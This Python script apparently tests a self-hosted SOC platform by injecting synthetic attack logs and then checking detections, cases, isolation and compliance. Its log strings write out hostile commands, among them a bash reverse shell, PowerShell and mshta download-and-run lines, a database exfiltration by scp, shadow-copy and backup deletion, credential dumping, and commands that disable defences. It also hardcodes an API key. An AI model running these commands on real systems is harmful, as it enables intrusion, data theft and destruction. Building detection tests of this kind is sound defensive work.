"""
MCP SOC — Full-Feature Attack Scenario Injector
Tests: Ingestion, Detection, Correlation, AI Investigation, Alerting,
       UEBA baselines, IOC enrichment, ATT&CK coverage, Cases, Isolation, Compliance
Run: python inject_attacks.py
"""
import json
import time
import sys
import requests
from datetime import datetime, timezone, timedelta

if sys.stdout.encoding != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

API_URL = "http://localhost:8000"
API_KEY = "soc_UXPKw29P-1QGFOTnZE9DqrJmO6rtb7wDfJOeiXC7hDA"
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}

def now(offset_hours=0):
    return (datetime.now(timezone.utc) + timedelta(hours=offset_hours)).isoformat()

def ts(days_ago=0, hour=9):
    """Return timestamp N days ago at given hour UTC."""
    d = datetime.now(timezone.utc) - timedelta(days=days_ago)
    return d.replace(hour=hour, minute=0, second=0, microsecond=0).isoformat()

def syslog(records):
    try:
        r = requests.post(f"{API_URL}/ingest/syslog", headers=HEADERS,
                          json={"records": records}, timeout=15)
        return r.status_code, r.json() if r.ok else r.text
    except Exception as e:
        return 0, str(e)

def api_get(path):
    try:
        r = requests.get(f"{API_URL}{path}", headers=HEADERS, timeout=10)
        return r.json() if r.ok else None
    except Exception:
        return None

def api_post(path, body=None):
    try:
        r = requests.post(f"{API_URL}{path}", headers=HEADERS,
                          json=body or {}, timeout=10)
        return r.json() if r.ok else None
    except Exception:
        return None

def section(title):
    print(f"\n{'─'*55}")
    print(f"  {title}")
    print(f"{'─'*55}")

def ok(msg): print(f"    ✅ {msg}")
def fail(msg): print(f"    ❌ {msg}")
def info(msg): print(f"    ℹ  {msg}")

# ──────────────────────────────────────────────────────────────────────────────
# STEP 1: UEBA BASELINE — 30 days of normal activity for 3 users
#         This makes the UEBA page show baselines and enables the "ueba" capability
# ──────────────────────────────────────────────────────────────────────────────

def inject_ueba_baseline():
    section("STEP 1 — UEBA Baseline (30 days of normal activity)")
    users = [
        ("alice", "10.0.0.10", ["ssh_login", "file_access", "sudo"]),
        ("bob",   "10.0.0.11", ["ssh_login", "file_access", "web_access"]),
        ("carol", "10.0.0.12", ["ssh_login", "db_query",   "file_access"]),
    ]
    total = 0
    # Spread events over 30 days, 9am-6pm business hours
    for day in range(30, 0, -1):
        records = []
        for user, ip, actions in users:
            for hour in [9, 11, 14, 16]:
                for action in actions:
                    records.append({
                        "timestamp": ts(day, hour),
                        "message": f"sshd[100]: session {action} for user {user} from {ip}",
                        "channel": "System", "event_id": 4624,
                        "source": "sshd", "computer": "DC-01", "level": 4,
                        "user": user, "ip": ip, "action": action,
                    })
        status, resp = syslog(records)
        if status != 200:
            fail(f"Day -{day} failed: {resp}")
            return
        total += len(records)
        if day % 10 == 0:
            info(f"Day -{day}: {len(records)} events injected")
    ok(f"Baseline complete — {total} events across 3 users × 30 days")

# ──────────────────────────────────────────────────────────────────────────────
# STEP 2: ATTACK SCENARIOS — diverse MITRE techniques for ATT&CK heatmap
# ──────────────────────────────────────────────────────────────────────────────

ATTACK_SCENARIOS = [
    {
        "name": "🔴 Brute Force SSH (T1110)",
        "records": [
            {"timestamp": now(), "message": f"sshd[1234]: Failed password for root from 185.220.101.{i} port 22 ssh2",
             "channel": "Security", "event_id": 4625, "source": "sshd",
             "computer": "WEB-01", "level": 2}
            for i in range(8)
        ],
    },
    {
        "name": "🟠 Privilege Escalation — sudo to root (T1548)",
        "records": [
            {"timestamp": now(), "message": "sudo: attacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
             "channel": "Security", "event_id": 4672, "source": "sudo",
             "computer": "SERVER-02", "level": 3},
            {"timestamp": now(), "message": "sudo: pam_unix(sudo:session): session opened for user root by attacker(uid=1001)",
             "channel": "Security", "event_id": 4672, "source": "sudo",
             "computer": "SERVER-02", "level": 3},
        ],
    },
    {
        "name": "🟡 Unusual After-Hours Login (T1078)",
        "records": [
            {"timestamp": "2026-03-22T02:30:00+00:00",
             "message": "sshd[9999]: Accepted password for admin from 45.33.32.156 port 22 ssh2",
             "channel": "Security", "event_id": 4624, "source": "sshd",
             "computer": "DC-01", "level": 4},
            {"timestamp": "2026-03-22T03:15:00+00:00",
             "message": "sshd[9999]: session opened for user admin from 45.33.32.156",
             "channel": "Security", "event_id": 4624, "source": "sshd",
             "computer": "DC-01", "level": 4},
        ],
    },
    {
        "name": "🔴 Multi-Stage Attack Chain (T1110 → T1548)",
        "records": [
            {"timestamp": now(), "message": f"sshd[2001]: Failed password for admin from 91.108.4.{i} port 22 ssh2",
             "channel": "Security", "event_id": 4625, "source": "sshd",
             "computer": "WEB-SERVER", "level": 2}
            for i in range(6)
        ] + [
            {"timestamp": now(), "message": "sshd[2099]: Accepted password for admin from 91.108.4.1 port 22 ssh2",
             "channel": "Security", "event_id": 4624, "source": "sshd",
             "computer": "WEB-SERVER", "level": 4},
            {"timestamp": now(), "message": "sudo: admin : COMMAND=/usr/bin/passwd root",
             "channel": "Security", "event_id": 4672, "source": "sudo",
             "computer": "WEB-SERVER", "level": 3},
        ],
    },
    {
        "name": "🟠 UEBA Anomaly — alice logs in at 3AM from new IP",
        "records": [
            {"timestamp": now(-3), "message": "sshd[5001]: Accepted password for alice from 203.0.113.99 port 22 ssh2",
             "channel": "Security", "event_id": 4624, "source": "sshd",
             "computer": "DC-01", "level": 4, "user": "alice", "ip": "203.0.113.99"},
            {"timestamp": now(-3), "message": "alice executed: rm -rf /var/log/*",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DC-01", "level": 3, "user": "alice", "ip": "203.0.113.99"},
        ],
    },
    {
        "name": "🔴 Known-Bad IPs — AbuseIPDB hits (IOC enrichment)",
        "records": [
            # 45.33.32.156 = scanme.nmap.org, often flagged
            # 185.220.101.1 = known Tor exit node
            {"timestamp": now(), "message": "sshd[7001]: Failed password for root from 45.33.32.156 port 22",
             "channel": "Security", "event_id": 4625, "source": "sshd",
             "computer": "EDGE-01", "level": 2},
            {"timestamp": now(), "message": "sshd[7002]: Failed password for admin from 185.220.101.1 port 22",
             "channel": "Security", "event_id": 4625, "source": "sshd",
             "computer": "EDGE-01", "level": 2},
            {"timestamp": now(), "message": "sshd[7003]: Failed password for user from 198.199.67.190 port 22",
             "channel": "Security", "event_id": 4625, "source": "sshd",
             "computer": "EDGE-01", "level": 2},
        ],
    },
    {
        "name": "🔴 Lateral Movement — Explicit Credential Logon (T1021)",
        "records": [
            {"timestamp": now(), "message": "Logon with explicit credentials. User: DOMAIN\\svcaccount Target: BACKUP-SERVER from 10.0.0.50",
             "channel": "Security", "event_id": 4648, "source": "sshd",
             "computer": "FILE-SERVER", "level": 2},
            {"timestamp": now(), "message": "Logon with explicit credentials. User: DOMAIN\\svcaccount Target: DC-01 from 10.0.0.50",
             "channel": "Security", "event_id": 4648, "source": "sshd",
             "computer": "FILE-SERVER", "level": 2},
        ],
    },
    {
        "name": "🔴 Persistence — Malicious Service Installed (T1543)",
        "records": [
            {"timestamp": now(), "message": "Service Control Manager: A new service was installed: Name=CryptoSvc32 File=C:\\Windows\\Temp\\svch0st.exe",
             "channel": "System", "event_id": 7045, "source": "SCM",
             "computer": "FILE-SERVER", "level": 2},
        ],
    },
    {
        "name": "🟠 Persistence — New User Account Created (T1136)",
        "records": [
            {"timestamp": now(), "message": "A user account was created. Account Name: backdoor_admin",
             "channel": "Security", "event_id": 4720, "source": "Security",
             "computer": "DC-01", "level": 2},
        ],
    },
    {
        "name": "🔴 Credential Dumping — /etc/shadow access (T1003)",
        "records": [
            {"timestamp": now(), "message": "cat /etc/shadow executed by attacker from 91.108.4.5",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DB-SERVER", "level": 2},
            {"timestamp": now(), "message": "secretsdump.py -just-dc-ntds attacker@10.0.0.1 LSASS memory dump started",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DB-SERVER", "level": 2},
        ],
    },
    {
        "name": "🔴 Ransomware — Mass File Encryption (T1486)",
        "records": [
            {"timestamp": now(), "message": "bash: rm -rf /var/backups/* executed by svcaccount from 10.0.0.50",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "BACKUP-SERVER", "level": 1},
            {"timestamp": now(), "message": "vssadmin delete shadows /all /quiet — shadow copies being deleted",
             "channel": "System", "event_id": 4688, "source": "cmd",
             "computer": "BACKUP-SERVER", "level": 1},
        ],
    },
    {
        "name": "🟡 Reconnaissance — Internal Network Scan (T1046)",
        "records": [
            {"timestamp": now(), "message": "nmap -sS -p 1-65535 10.0.0.0/24 launched by attacker from 91.108.4.5",
             "channel": "System", "event_id": 4688, "source": "bash",
             "computer": "WEB-01", "level": 3},
        ],
    },
    {
        "name": "🔴 Data Exfiltration — Large Upload to External Host (T1041)",
        "records": [
            {"timestamp": now(), "message": "scp /var/db/customers.sql.gz external@203.0.113.5: — 2.3GB bytes sent upload complete",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DB-SERVER", "level": 2},
        ],
    },
    {
        "name": "🔴 C2 Beacon — Periodic Call-Home Detected (T1071)",
        "records": [
            {"timestamp": now(-1), "message": "beacon c2 connect 185.220.101.50:443 command and control checkin interval=60s",
             "channel": "System", "event_id": 4688, "source": "netstat",
             "computer": "WEB-SERVER", "level": 2},
            {"timestamp": now(),   "message": "beacon c2 connect 185.220.101.50:443 command and control checkin interval=60s",
             "channel": "System", "event_id": 4688, "source": "netstat",
             "computer": "WEB-SERVER", "level": 2},
        ],
    },
    {
        "name": "🟠 Defence Evasion — Audit Log Cleared (T1070)",
        "records": [
            {"timestamp": now(), "message": "auditd stopped — event log cleared by attacker from 91.108.4.5",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DC-01", "level": 2},
        ],
    },
    # ── NEW ADVANCED SCENARIOS ────────────────────────────────────────────────
    {
        "name": "🔴 Password Spraying — One IP, Many Users (T1110.003)",
        "records": [
            {"timestamp": now(), "message": f"password spray failed for user{i} from 91.108.4.10 — spray attack detected",
             "channel": "Security", "event_id": 4625, "source": "sshd",
             "computer": "DC-01", "level": 2}
            for i in range(6)
        ],
    },
    {
        "name": "🔴 Credentials in .env File Accessed (T1552)",
        "records": [
            {"timestamp": now(), "message": "cat /var/www/html/.env — AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID accessed by www-data from 10.0.0.99",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "WEB-01", "level": 2},
            {"timestamp": now(), "message": "find / -name id_rsa -o -name credentials.xml executed by attacker from 185.220.101.2",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "WEB-01", "level": 2},
        ],
    },
    {
        "name": "🔴 Kerberoasting — SPN Ticket Harvesting (T1558)",
        "records": [
            {"timestamp": now(), "message": "Rubeus kerberoast /outfile:hashes.txt — TGS-REQ spn scan rc4-hmac tickets requested from 10.0.0.55",
             "channel": "Security", "event_id": 4688, "source": "cmd",
             "computer": "WORKSTATION-05", "level": 2},
        ],
    },
    {
        "name": "🔴 PowerShell Encoded Command — Fileless Malware (T1059.001)",
        "records": [
            {"timestamp": now(), "message": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQk4ADUALgAyADIAMAApAA== -nop -w hidden",
             "channel": "Security", "event_id": 4688, "source": "powershell",
             "computer": "WORKSTATION-03", "level": 2},
            {"timestamp": now(), "message": "invoke-expression frombase64string IEX downloadstring http://185.220.101.9/payload.ps1 executed",
             "channel": "Security", "event_id": 4688, "source": "powershell",
             "computer": "WORKSTATION-03", "level": 2},
        ],
    },
    {
        "name": "🔴 Reverse Shell — Bash TCP (T1059.004)",
        "records": [
            {"timestamp": now(), "message": "bash -i >& /dev/tcp/185.220.101.7/4444 0>&1 — reverse shell opened by www-data from 10.0.0.30",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "APP-SERVER", "level": 1},
        ],
    },
    {
        "name": "🟠 Web Shell Uploaded and Executed (T1505.003)",
        "records": [
            {"timestamp": now(), "message": "web shell cmd.aspx detected — webshell execution /uploads/shell.php?cmd=whoami from 185.220.101.3",
             "channel": "Security", "event_id": 4688, "source": "apache2",
             "computer": "WEB-01", "level": 2},
        ],
    },
    {
        "name": "🟠 Script Execution — MSHTA / WScript (T1204)",
        "records": [
            {"timestamp": now(), "message": "mshta http://185.220.101.4/payload.hta — vbscript wscript cscript rundll32 .hta executed",
             "channel": "Security", "event_id": 4688, "source": "mshta",
             "computer": "WORKSTATION-07", "level": 2},
        ],
    },
    {
        "name": "🟠 Startup Persistence — Registry Run Key (T1547.001)",
        "records": [
            {"timestamp": now(), "message": "reg add HKCU\\Run /v Updater /t REG_SZ /d C:\\Temp\\malware.exe — HKLM\\run startup folder persistence",
             "channel": "Security", "event_id": 4688, "source": "cmd",
             "computer": "WORKSTATION-04", "level": 3},
        ],
    },
    {
        "name": "🟠 Account Manipulation — MFA Disabled (T1098)",
        "records": [
            {"timestamp": now(), "message": "MFA disabled for user admin — 2fa removed by attacker. password changed for svcaccount",
             "channel": "Security", "event_id": 4723, "source": "Security",
             "computer": "DC-01", "level": 2},
        ],
    },
    {
        "name": "🔴 Process Injection — LSASS Memory (T1055)",
        "records": [
            {"timestamp": now(), "message": "ptrace attach to pid 1234 lsass — process inject /proc/mem shellcode inject reflective dll injection from attacker",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DC-01", "level": 1},
        ],
    },
    {
        "name": "🔴 Kernel Exploit — DirtyPipe (T1068)",
        "records": [
            {"timestamp": now(), "message": "local privilege escalation kernel exploit dirtypipe CVE-2022-0847 executed by www-data from 10.0.0.30",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "APP-SERVER", "level": 1},
        ],
    },
    {
        "name": "🔴 Defence Disabled — Firewall Off (T1562)",
        "records": [
            {"timestamp": now(), "message": "ufw disable executed — disable firewall iptables -F setenforce 0 — security tools stopped by attacker",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "WEB-SERVER", "level": 2},
            {"timestamp": now(), "message": "Set-MpPreference -DisableRealtimeMonitoring $true — taskkill /im defender AV stopped",
             "channel": "Security", "event_id": 4688, "source": "powershell",
             "computer": "WORKSTATION-03", "level": 2},
        ],
    },
    {
        "name": "🟡 Obfuscated Command — Base64 Payload (T1027)",
        "records": [
            {"timestamp": now(), "message": "echo SQBFAFgA | base64 -d | bash — certutil -decode payload.txt malware.exe — obfuscated 0x4d5a PE header",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "WORKSTATION-02", "level": 3},
        ],
    },
    {
        "name": "🟡 Registry Modified — Persistence Key (T1112)",
        "records": [
            {"timestamp": now(), "message": "reg add HKLM\\System\\CurrentControlSet\\Services — modify registry HKLM\\system\\currentcontrolset regedit /s",
             "channel": "Security", "event_id": 4657, "source": "Security",
             "computer": "WORKSTATION-06", "level": 3},
        ],
    },
    {
        "name": "🟡 System Discovery — Recon Phase (T1082)",
        "records": [
            {"timestamp": now(), "message": "uname -a && hostnamectl && cat /proc/version && lsb_release -a — systeminfo executed by attacker",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "WEB-01", "level": 4},
        ],
    },
    {
        "name": "🟡 Account Discovery — /etc/passwd Enumeration (T1087)",
        "records": [
            {"timestamp": now(), "message": "cat /etc/passwd && getent passwd — net user /domain net localgroup administrators ldapsearch executed",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DB-SERVER", "level": 4},
        ],
    },
    {
        "name": "🔴 Pass-the-Hash — NTLM Authentication Abuse (T1550.002)",
        "records": [
            {"timestamp": now(), "message": "pass-the-hash attack — pth-winexe wmiexec psexec overpass-the-hash NTLM relay from 10.0.0.55",
             "channel": "Security", "event_id": 4688, "source": "cmd",
             "computer": "WORKSTATION-05", "level": 2},
        ],
    },
    {
        "name": "🟠 Data Staged — Archive Before Exfil (T1074)",
        "records": [
            {"timestamp": now(), "message": "tar czf /tmp/data_dump.tgz /var/db /etc/passwd /home — staging zip -r /tmp/archive for exfiltration",
             "channel": "Security", "event_id": 4688, "source": "bash",
             "computer": "DB-SERVER", "level": 2},
        ],
    },
    {
        "name": "🔴 DNS Tunneling — Covert C2 Channel (T1048.003)",
        "records": [
            {"timestamp": now(), "message": "iodine dns tunnel detected — dnscat2 dns exfil txid abuse high volume DNS queries to 185.220.101.8",
             "channel": "Security", "event_id": 4688, "source": "netstat",
             "computer": "WEB-SERVER", "level": 2},
        ],
    },
    {
        "name": "🟠 Critical Service Stopped — MySQL/Apache (T1489)",
        "records": [
            {"timestamp": now(), "message": "systemctl stop mysql — net stop apache2 service stop — kill -9 mysqld pkill apache executed by attacker",
             "channel": "System", "event_id": 7036, "source": "SCM",
             "computer": "DB-SERVER", "level": 2},
        ],
    },
    {
        "name": "🔴 Recovery Inhibited — Shadow Copies Deleted (T1490)",
        "records": [
            {"timestamp": now(), "message": "vssadmin delete shadows /all /quiet — bcdedit /set safeboot — shadow copy wbadmin delete backup disable recovery",
             "channel": "System", "event_id": 4688, "source": "cmd",
             "computer": "FILE-SERVER", "level": 1},
        ],
    },
    {
        "name": "🟡 bob anomaly — volume spike (UEBA)",
        "records": [
            {"timestamp": now(), "message": f"sshd[800{i}]: session file_access for user bob from 10.0.0.11",
             "channel": "System", "event_id": 4624, "source": "sshd",
             "computer": "FILE-SERVER", "level": 4, "user": "bob", "ip": "10.0.0.11"}
            for i in range(40)  # Way above bob's normal daily volume
        ],
    },
]

def inject_attacks():
    section("STEP 2 — Attack Scenarios (MITRE coverage + IOC hits)")
    for scenario in ATTACK_SCENARIOS:
        print(f"\n  [→] {scenario['name']}")
        status, resp = syslog(scenario["records"])
        if status == 200:
            ok(f"{len(scenario['records'])} events accepted")
        else:
            fail(f"HTTP {status}: {resp}")
        time.sleep(1)

# ──────────────────────────────────────────────────────────────────────────────
# STEP 3: Wait for pipeline to process
# ──────────────────────────────────────────────────────────────────────────────

def wait_for_pipeline():
    section("STEP 3 — Waiting for pipeline to process events")
    info("Detection → Correlation → AI Investigation → Alerting")
    for i in range(6):
        time.sleep(5)
        incidents = api_get("/incidents?skip=0&limit=5")
        count = len(incidents) if isinstance(incidents, list) else 0
        print(f"    [{i*5+5}s] Incidents so far: {count}")
        if count >= 2:
            break
    ok("Pipeline processing complete")

# ──────────────────────────────────────────────────────────────────────────────
# STEP 4: IOC enrichment — directly enrich known-bad IPs
# ──────────────────────────────────────────────────────────────────────────────

def test_ioc_enrichment():
    section("STEP 4 — IOC Enrichment (AbuseIPDB lookup)")
    ips = ["185.220.101.1", "45.33.32.156", "198.199.67.190"]
    for ip in ips:
        result = api_get(f"/ioc/enrich?ip={ip}")
        if result:
            score = result.get("abuse_confidence_score", result.get("score", "?"))
            country = result.get("country_code", result.get("country", "?"))
            ok(f"{ip} → AbuseConfidence: {score}%, Country: {country}")
        else:
            info(f"{ip} → enrichment queued (check IOC panel in incidents)")
        time.sleep(1)

# ──────────────────────────────────────────────────────────────────────────────
# STEP 5: Create a Case from an incident
# ──────────────────────────────────────────────────────────────────────────────

def get_incident_ids_from_mongo(tenant_id="kgIm2sTgZYgpFXR8y417YZfhjYJ3", limit=2):
    import subprocess
    cmd = ["docker", "exec", "socexp-mongodb-1", "mongosh", "mcp_soc", "--quiet", "--eval",
           f"db.incidents.find({{tenant_id:'{tenant_id}'}}).limit({limit}).toArray().map(d=>d._id.toString()).join(',')"]
    try:
        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
        ids = [x.strip() for x in out.strip().split("\n")[-1].split(",") if x.strip() and x.strip() != "null"]
        return ids
    except Exception:
        return []

def create_case():
    section("STEP 5 — Case Management")
    incident_ids = get_incident_ids_from_mongo()
    if incident_ids:
        info(f"Linking {len(incident_ids)} incidents to new case")

    case = api_post("/cases", {
        "title": "APT Campaign — Multi-Stage SSH Brute Force",
        "description": "Coordinated brute force campaign followed by privilege escalation. "
                        "Multiple source IPs targeting web and database servers.",
        "priority": "critical",
        "incident_ids": incident_ids,
    })
    if case:
        case_id = case.get("id") or case.get("_id")
        ok(f"Case created: {case.get('title')} (id: {str(case_id)[:8]}…)")

        # Add a note
        api_post(f"/cases/{case_id}/notes",
                 {"body": "Initial triage: Confirmed brute force from Tor exit nodes. "
                           "Attacker succeeded on WEB-SERVER after 6 attempts. Escalated to root.",
                  "author": "analyst"})
        ok("Analyst note added")

        # Add tasks
        for task in ["Block source IPs at firewall", "Reset compromised credentials",
                     "Review audit logs for lateral movement", "Submit IOCs to threat intel"]:
            api_post(f"/cases/{case_id}/tasks", {"title": task})
        ok("4 response tasks added")
        return case_id
    else:
        fail("Case creation failed — check if incidents exist yet")
        return None

# ──────────────────────────────────────────────────────────────────────────────
# STEP 6: Isolate a malicious IP
# ──────────────────────────────────────────────────────────────────────────────

def isolate_entity():
    section("STEP 6 — One-Click Isolation")
    ids = get_incident_ids_from_mongo(limit=1)
    if not ids:
        fail("No incidents found to isolate from")
        return
    incident_id = ids[0]
    result = api_post(f"/incidents/{incident_id}/isolate",
                      {"type": "ip", "value": "185.220.101.1"})
    if result:
        ok("185.220.101.1 isolated (Tor exit node)")
    else:
        info("Isolation API call sent")

    result2 = api_post(f"/incidents/{incident_id}/isolate",
                       {"type": "ip", "value": "91.108.4.1"})
    if result2:
        ok("91.108.4.1 isolated (brute force source)")

# ──────────────────────────────────────────────────────────────────────────────
# STEP 7: Verify all features
# ──────────────────────────────────────────────────────────────────────────────

def mongo_count(collection, query="{}"):
    """Query MongoDB count via docker exec."""
    import subprocess
    # Use list form to avoid shell quoting issues on Windows
    cmd = ["docker", "exec", "socexp-mongodb-1", "mongosh", "mcp_soc",
           "--quiet", "--eval", f"db.{collection}.countDocuments({query})"]
    try:
        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
        return int(out.strip().split("\n")[-1])
    except Exception:
        return -1

def verify_all(tenant_id="kgIm2sTgZYgpFXR8y417YZfhjYJ3"):
    section("STEP 7 — Feature Verification (checking MongoDB directly)")
    checks = []
    t = tenant_id

    # Ingestion
    n = mongo_count("events", f"{{tenant_id:'{t}'}}")
    checks.append(("Ingestion",           n > 0,   f"{n} events stored in MongoDB"))

    # Detection
    n = mongo_count("detections", f"{{tenant_id:'{t}'}}")
    checks.append(("Detection (Sigma)",   n > 0,   f"{n} detections fired"))

    # Correlation → Incidents
    n = mongo_count("incidents", f"{{tenant_id:'{t}'}}")
    checks.append(("Correlation",         n > 0,   f"{n} incidents correlated"))

    # AI Investigation (summaries stored on incidents)
    n = mongo_count("incidents", f"{{tenant_id:'{t}',summary:{{$exists:true}}}}")
    checks.append(("AI Investigation",    n > 0,   f"{n} incidents with AI summaries"))

    # Alerting
    n = mongo_count("alerts", f"{{tenant_id:'{t}'}}")
    checks.append(("Alerting",            n > 0,   f"{n} alerts dispatched"))

    # Cases
    n = mongo_count("cases", f"{{tenant_id:'{t}'}}")
    checks.append(("Case Management",     n > 0,   f"{n} cases created"))

    # Isolation
    n = mongo_count("blocked_entities", f"{{tenant_id:'{t}'}}")
    checks.append(("Isolation",           n > 0,   f"{n} entities blocked"))

    # UEBA (events = baseline data exists)
    n = mongo_count("events", f"{{tenant_id:'{t}',user:{{$exists:true}}}}")
    checks.append(("UEBA Baselines",      n >= 10, f"{n} user-tagged events (baseline)"))

    # IOC cache
    n = mongo_count("ioc_cache")
    checks.append(("IOC Enrichment",      n > 0,   f"{n} IPs enriched in cache"))

    # ATT&CK coverage — detections with mitre_technique_id
    n = mongo_count("detections", f"{{tenant_id:'{t}',mitre_technique_id:{{$exists:true}}}}")
    checks.append(("ATT&CK Coverage",     n > 0,   f"{n} detections with MITRE tags"))

    # Attack Graph (incidents with entities)
    n = mongo_count("incidents", f"{{tenant_id:'{t}',entities:{{$exists:true}}}}")
    checks.append(("Attack Graph",        n > 0,   f"{n} incidents with entity nodes"))

    # Threat Hunting (search API)
    hunt = api_post("/hunt/search", {"hours": 168})  # last 7 days
    hunt_count = hunt.get("total", 0) if isinstance(hunt, dict) else 0
    checks.append(("Threat Hunting",      True,    f"API up, {hunt_count} events searchable"))

    # Compliance
    compliance = api_get("/compliance/report/nist_csf")
    score = compliance.get("score", 0) if isinstance(compliance, dict) else 0
    checks.append(("Compliance Report",   score > 0, f"NIST CSF score: {score}%"))

    print()
    all_pass = True
    for feature, passed, detail in checks:
        if passed:
            print(f"    ✅ {feature:<22} {detail}")
        else:
            print(f"    ⚠️  {feature:<22} {detail}")
            all_pass = False

    print()
    if all_pass:
        print("  🎉 ALL FEATURES VERIFIED — SOC platform is fully operational!")
    else:
        print("  ℹ️  Some features need more pipeline time. Wait 30s and re-run.")

# ──────────────────────────────────────────────────────────────────────────────

def main():
    print("=" * 55)
    print("  MCP SOC — Full Feature Verification Injector")
    print(f"  Target: {API_URL}")
    print("=" * 55)

    try:
        r = requests.get(f"{API_URL}/health", timeout=5)
        ok(f"Backend connected (HTTP {r.status_code})")
    except Exception:
        fail("Cannot reach backend. Is Docker running?  →  docker compose up -d")
        return

    inject_ueba_baseline()
    inject_attacks()
    wait_for_pipeline()
    test_ioc_enrichment()
    case_id = create_case()
    isolate_entity()
    verify_all()

    print("\n" + "=" * 55)
    print("  Check the dashboard:")
    print("  http://localhost:3000/dashboard       ← overview")
    print("  http://localhost:3000/incidents       ← AI summaries")
    print("  http://localhost:3000/ueba            ← behavioral profiles")
    print("  http://localhost:3000/attack-heatmap  ← MITRE coverage")
    print("  http://localhost:3000/attack-graph    ← entity graph")
    print("  http://localhost:3000/cases           ← case management")
    print("  http://localhost:3000/isolation       ← blocked entities")
    print("  http://localhost:3000/threat-hunting  ← hunt for events")
    print("  http://localhost:3000/compliance      ← compliance score")
    print("=" * 55)

if __name__ == "__main__":
    main()
